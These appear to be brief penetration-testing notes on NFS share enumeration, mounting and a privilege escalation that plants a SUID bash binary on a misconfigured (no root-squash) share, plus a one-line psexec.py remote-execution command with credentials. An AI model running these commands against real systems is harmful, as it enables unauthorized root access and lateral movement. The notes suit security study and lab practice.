# NFS
- install `**nfs-common**`
- default port: `2049`
- show shares: `sudo showmount -e <IP>`
- mount share `sudo mount -t nfs IP:share /tmp/mount/ -nolock`
## Root-squash
Misconfigured NFS shares will allow ownership to be persisted through transfer --> abuse using Set UID bash binary (for example)
- `sudo chmod +s /path/to/bash`
- `cp /path/to/bash /tmp/mount`
- on target: `./bash -p`

# PSexec
`psexec.py user:'passwd'@1.1.1.1`